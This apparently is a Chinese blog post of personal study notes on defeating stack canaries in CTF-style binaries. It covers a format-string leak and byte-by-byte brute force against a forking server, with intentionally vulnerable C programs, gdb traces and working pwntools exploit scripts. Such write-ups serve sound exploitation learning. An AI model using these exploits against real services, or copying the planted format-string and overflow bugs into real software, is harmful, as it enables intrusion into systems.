---
title: canary的绕过
date: 2018-03-17 19:28:58
tags: PWN
---

## 0x00 前言

网上查阅相关文章后自己做的笔记

## 0x01 格式化字符串绕过

程序：
​    

```
#include <stdio.h>
#include <unistd.h>
void getflag(void) {
	char flag[100];
	FILE *fp = fopen("./flag", "r");
	if (fp == NULL) {
		puts("get flag error");
	}
	fgets(flag, 100, fp);
	puts(flag);
}
void init() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
}
void fun(void) {
	char buffer[100];
	read(STDIN_FILENO, buffer, 120);
}
int main(void) {
	char buffer[6];
	init();
	scanf("%6s",buffer);
	printf(buffer);
	fun();
}
```
<!--more-->
程序正常的走完了流程，到函数执行完的时候，程序会再次从把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序

{% asset_img 0.png%}


可以看到`canary`保存在`ebp-0xc`处

那么我们要怎样泄露canary的值呢？既然canary的值保存在栈中，那么就可以使用格式化字符串读出来，我们只需要知道偏移即可，那么gdb在调用printf函数处下断点，然后跑起来：

```
mask@mask-virtual-machine:~/canary$ gdb ./bin
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./bin...(no debugging symbols found)...done.
gdb-peda$ b *0x08048767
Breakpoint 1 at 0x8048767
```

然后随便输一个值，123456
​    

```
[----------------------------------registers-----------------------------------]
EAX: 0xbffff056 ("123456")
EBX: 0x0 
ECX: 0x1 
EDX: 0xb7fbc87c --> 0x0 
ESI: 0xb7fbb000 --> 0x1b1db0 
EDI: 0xb7fbb000 --> 0x1b1db0 
EBP: 0xbffff068 --> 0x0 
ESP: 0xbffff040 --> 0xbffff056 ("123456")
EIP: 0x8048767 (<main+60>:	call   0x80484c0 <printf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048760 <main+53>:	subesp,0xc
   0x8048763 <main+56>:	leaeax,[ebp-0x12]
   0x8048766 <main+59>:	push   eax
=> 0x8048767 <main+60>:	call   0x80484c0 <printf@plt>
   0x804876c <main+65>:	addesp,0x10
   0x804876f <main+68>:	call   0x80486f3 <fun>
   0x8048774 <main+73>:	moveax,0x0
   0x8048779 <main+78>:	movedx,DWORD PTR [ebp-0xc]
Guessed arguments:
arg[0]: 0xbffff056 ("123456")
[------------------------------------stack-------------------------------------]
0000| 0xbffff040 --> 0xbffff056 ("123456")
0004| 0xbffff044 --> 0xbffff056 ("123456")
0008| 0xbffff048 --> 0xbffff068 --> 0x0 
0012| 0xbffff04c --> 0x804874c (<main+33>:	subesp,0x8)
0016| 0xbffff050 --> 0x1 
0020| 0xbffff054 --> 0x3231f114 
0024| 0xbffff058 ("3456")
0028| 0xbffff05c --> 0x65773a00 ('')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048767 in main ()
```

栈的情况：
​    

```
[------------------------------------stack-------------------------------------]
0000| 0xbffff040 --> 0xbffff056 ("123456")
0004| 0xbffff044 --> 0xbffff056 ("123456")
0008| 0xbffff048 --> 0xbffff068 --> 0x0 
0012| 0xbffff04c --> 0x804874c (<main+33>:	subesp,0x8)
0016| 0xbffff050 --> 0x1 
0020| 0xbffff054 --> 0x3231f114 
0024| 0xbffff058 ("3456")
0028| 0xbffff05c --> 0x65773a00 ('')
[------------------------------------------------------------------------------]
```

因为canary保存在`ebp-0xc` = `0xbffff05c`,格式化参数format保存在`0xbffff040`，根据栈布局可以知道参数偏移为7

那么接下来只要通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。

还有一点，fun函数的地址,直接IDA查看便是：
​    

```
.text:0804863B ; =============== S U B R O U T I N E =======================================
.text:0804863B
.text:0804863B ; Attributes: bp-based frame
.text:0804863B
.text:0804863B public getflag
.text:0804863B getflag proc near
```

下面编写exp:
​    

```
from pwn import *
context.log_level = 'debug'
cn = process('./bin')
cn.sendline('%7$x')
canary = int(cn.recv(),16)
print hex(canary)
cn.send('a'*100 + p32(canary) + 'a'*12 + p32(0x0804863b))
flag = cn.recv()
log.success('flag is:' + flag)
```

运行：

```
mask@mask-virtual-machine:~/canary$ python exp.py
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './bin': pid 5571
0xbe616300
[+] flag is:this is flag

[*] Stopped process './bin' (pid 5571)
```



## 0x02 针对fork的进程绕过

原理引用一位大佬的博客的原文：

> 对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。
>
> 另外有一点就是canary的最低位是0x00，这么做为了防止canary的值泄漏。比如在canary上面是一个字符串，正常来说字符串后面有0截断，如果我们恶意写满字符串空间，而程序后面又把字符串打印出来了，那个由于没有0截断canary的值也被顺带打印出来了。设计canary的人正是考虑到了这一点，就让canary的最低位恒为零，这样就不存在上面截不截断的问题了。

程序：

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
void getflag(void) {
	char flag[100];
	FILE *fp = fopen("./flag", "r");
	if (fp == NULL) {
	puts("get flag error");
		exit(0);
	}   
	fgets(flag, 100, fp);
	puts(flag);
}
void init() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
}
void fun(void) {
	char buffer[100];
	read(STDIN_FILENO, buffer, 120);
}
int main(void) {
init();
	pid_t pid;
	while(1) {
		pid = fork();
		if(pid < 0) {
			puts("fork error");
			exit(0);
		}
		else if(pid == 0) {
			puts("welcome");
			fun();
			puts("recv sucess");
		}
		else {
			wait(0);
		}
	}
}
```

exp:

```
from pwn import *
context.log_level = 'debug'
cn = process('./bin')
cn.recvuntil('welcome\n')
canary = '\x00'

#爆破cannary
for j in range(3):
	for i in range(0x100):
		cn.send('a'*100 + canary + chr(i))
		a = cn.recvuntil('welcome\n')
		if 'recv' in a:
			canary += chr(i)
			break

cn.sendline('a'*100 + canary + 'a'*12 + p32(0x0804864b))
flag = cn.recv()
cn.close()
log.success('flag is:' + flag)
```

跑呀跑呀跑呀~

{% asset_img 1.png%}